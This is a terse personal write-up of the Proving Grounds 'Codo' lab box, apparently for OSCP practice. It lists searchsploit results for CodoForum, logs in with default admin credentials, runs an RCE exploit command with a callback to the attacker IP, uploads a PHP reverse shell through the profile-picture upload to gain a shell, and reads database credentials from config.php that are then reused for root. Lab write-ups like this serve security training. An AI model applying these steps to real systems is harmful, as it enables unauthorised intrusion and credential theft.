---
layout: post
title:  "Write Up: Proving Grounds Practice - Codo"
date:   2024-07-29 16:53:42 -0400
categories: oscp proving-grounds TJNull
---


192.168.194.23
me - 192.168.45.213

┌──(kali㉿kali)-[~/offsec/pg-practice/Codo]
└─$ searchsploit codoforum                       
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
CodoForum 2.5.1 - Arbitrary File Download                                         | php/webapps/36320.txt
CodoForum 3.2.1 - SQL Injection                                                   | php/webapps/40150.txt
CodoForum 3.3.1 - Multiple SQL Injections                                         | php/webapps/37820.txt
CodoForum 3.4 - Persistent Cross-Site Scripting                                   | php/webapps/40015.txt
Codoforum 4.8.3 - 'input_txt' Persistent Cross-Site Scripting                     | php/webapps/47886.txt
Codoforum 4.8.3 - Persistent Cross-Site Scripting                                 | php/webapps/47876.txt
CodoForum v5.1 - Remote Code Execution (RCE)                                      | php/webapps/50978.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


http://192.168.194.23/admin/index.php
admin : admin

Current version: V.5.1.105


jubjub
NFp$2Re@9@Jh9%f


python3 50978.py -t http://192.168.194.23/admin/index.php -u admin -p admin -i http://192.168.45.213 -n 80

this stupid thing isnt working but we do have access to the admin console so lets try something else:


uploading admins profile picture, upload php reverse shell afterf adding php as an appropriate extention thype. Then upload and find the new file by checking the profile pic source;

src="http://192.168.194.23/sites/default/assets/img/profiles/66a825243069d.php"


Clicking that url in a browser will trigger the script which then calls nc running on our kali machine and we get a reverse shell on the box
=======================================================================================================

found this file after doing some digging:

```
www-data@codo:/var/www/html/sites/default$ cat config.php
cat config.php
<?php

/* 
 * @CODOLICENSE
 */

defined('IN_CODOF') or die();

$CF_installed=true;

function get_codo_db_conf() {


    $config = array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'database' => 'codoforumdb',
  'username' => 'codo',
  'password' => 'FatPanda123',
  'prefix' => '',
  'charset' => 'utf8',
  'collation' => 'utf8_unicode_ci',
);

    return $config;
}

$DB = get_codo_db_conf();

$CONF = array (
    
  'driver' => 'Custom',
  'UID'    => '631042af544ef',
  'SECRET' => '631042af544f0',
  'PREFIX' => ''
);
```

trying to su offsec didnt work but su root DID work